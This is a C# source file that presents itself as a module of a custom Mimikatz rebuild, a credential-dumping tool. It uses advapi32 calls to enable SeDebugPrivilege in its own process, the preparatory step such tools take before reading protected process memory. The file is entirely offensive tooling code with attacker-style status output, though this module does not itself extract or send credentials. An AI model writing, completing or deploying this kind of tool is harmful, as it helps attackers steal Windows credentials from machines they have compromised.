using System;
using System.Runtime.InteropServices;

namespace MimikatzCustom.Modules
{
    public class PrivilegeModule
    {
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, 
            ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

        [StructLayout(LayoutKind.Sequential)]
        private struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct TOKEN_PRIVILEGE
        {
            public LUID Luid;
            public uint Attributes;
        }

        private struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public TOKEN_PRIVILEGE[] Privileges;
        }

        private const uint SE_PRIVILEGE_ENABLED = 2;
        private const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        private const uint TOKEN_QUERY = 0x0008;

        public static void EnableDebugPrivilege()
        {
            try
            {
                IntPtr tokenHandle = IntPtr.Zero;
                if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, 
                    TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out tokenHandle))
                {
                    Console.WriteLine("[!] Failed to open process token");
                    return;
                }

                LUID luid = new LUID();
                if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out luid))
                {
                    Console.WriteLine("[!] Failed to lookup SeDebugPrivilege");
                    return;
                }

                TOKEN_PRIVILEGES tokenPrivileges = new TOKEN_PRIVILEGES();
                tokenPrivileges.PrivilegeCount = 1;
                tokenPrivileges.Privileges = new TOKEN_PRIVILEGE[1];
                tokenPrivileges.Privileges[0].Luid = luid;
                tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

                if (!AdjustTokenPrivileges(tokenHandle, false, ref tokenPrivileges, 0, IntPtr.Zero, IntPtr.Zero))
                {
                    Console.WriteLine("[!] Failed to adjust token privileges");
                    return;
                }

                Console.WriteLine("[+] Successfully enabled SeDebugPrivilege");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
            }
        }
    }
}